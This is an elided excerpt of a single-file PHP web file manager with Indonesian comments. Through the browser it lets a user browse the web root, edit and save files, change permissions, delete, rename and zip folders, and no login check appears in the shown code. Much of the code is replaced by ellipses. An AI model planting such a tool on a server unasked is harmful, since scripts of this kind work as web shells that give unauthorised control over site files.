...
// Root = web root (DOCUMENT_ROOT) biar gak bocor absolute path
$root = realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// Path aktif: dari ?rel= (relatif terhadap $root)
...
// ==== HOME button target: folder tempat file ini berada ====
...
function zip_create(string $source, string $zipPath): bool{
  ...
  if (is_dir($source)) {
    ...
    foreach ($it as $fsInfo) {
      ...
      if (realpath($fp) === $zipReal) continue; // hindari mengarsip file zip output
...
// Serve content editor (?edit= RELATIF)
if (isset($_GET['edit'])) {
...
// Save Edit (POST: edit_file = RELATIF)
...
// Change Permission (chmod) — target RELATIF dari root
...
<body>
  ...
  <p style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
    ...
    <?php if ($path !== $root): ?>
      <a href="?rel=<?=urlencode(rel_from_root(dirname($path)))?>"><i class="fa fa-arrow-left"></i> Kembali</a>
    <?php endif; ?>
    ...
    <a class="btn" href="?rel=<?=urlencode(rel_from_root($path))?>&zipdir=1" onclick="return confirm('Zip seluruh isi folder ini?');"><i class="fa fa-file-zipper"></i> Zip</a>
    ...
    <?php
      ...
      function row_dir($d,$path){
        ...
        echo "<td class='col-acts'>
                <a href='?rel=".urlencode(rel_from_root($path))."&delete=$purl' onclick='return confirm(\"Hapus folder?\")' title='Hapus'><i class='fa fa-trash'></i></a> |
      ...
      function row_file($f,$path){
        ...
        echo "<td class='col-acts'>
                ...
                <a href='?rel=".urlencode(rel_from_root($path))."&delete=$purl' onclick='return confirm(\"Hapus file?\")' title='Hapus'><i class='fa fa-trash'></i></a> |
                <a href='#' onclick=\"openRename('$name')\" title='Rename'><i class='fa fa-edit'></i></a>
              </td>";
        echo "</tr>";
      }
  ...
  <script>
    ...
    function openEdit(relPath){
      fetch('?edit='+encodeURIComponent(relPath))
        ...
        .then(t=>{
          ...
          document.getElementById('edit_file').value = relPath; // simpan relatif
    ...
    function openPerm(relPath,current){
      document.getElementById('chmod_target').value = relPath; // kirim relatif
